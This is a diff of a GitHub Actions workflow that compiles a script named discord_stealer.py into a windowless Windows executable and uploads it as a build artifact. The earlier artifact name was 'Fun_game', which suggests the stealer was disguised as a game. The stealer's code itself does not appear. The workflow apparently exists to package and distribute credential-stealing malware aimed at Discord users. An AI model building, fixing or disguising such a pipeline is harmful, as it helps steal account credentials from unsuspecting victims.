@@ -5,7 +5,7 @@ on:
     branches: [ "main" ]
   workflow_dispatch:
 
-# Force GitHub Actions runner to execute action steps using Node.js 24
+# Explicitly force GitHub Actions to use Node.js 24 for all JS actions
 env:
   FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: "true"
 
@@ -22,18 +22,26 @@ jobs:
       with:
         python-version: '3.11'
 
-    - name: Install PyInstaller
+    - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
         pip install pyinstaller
+        if (Test-Path "requirements.txt") { pip install -r requirements.txt }
+
+    - name: Verify script existence
+      run: |
+        if (-not (Test-Path "discord_stealer.py")) {
+          Write-Error "Could not find discord_stealer.py in the root directory!"
+          exit 1
+        }
 
     - name: Build Executable with PyInstaller
       run: |
-        pyinstaller --onefile --noconsole disco_stealer.py
+        pyinstaller --onefile --noconsole discord_stealer.py
 
     - name: Upload Executable Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: Fun_game
+        name: DiscordStealer-Executable
         path: dist/discord_stealer.exe
         
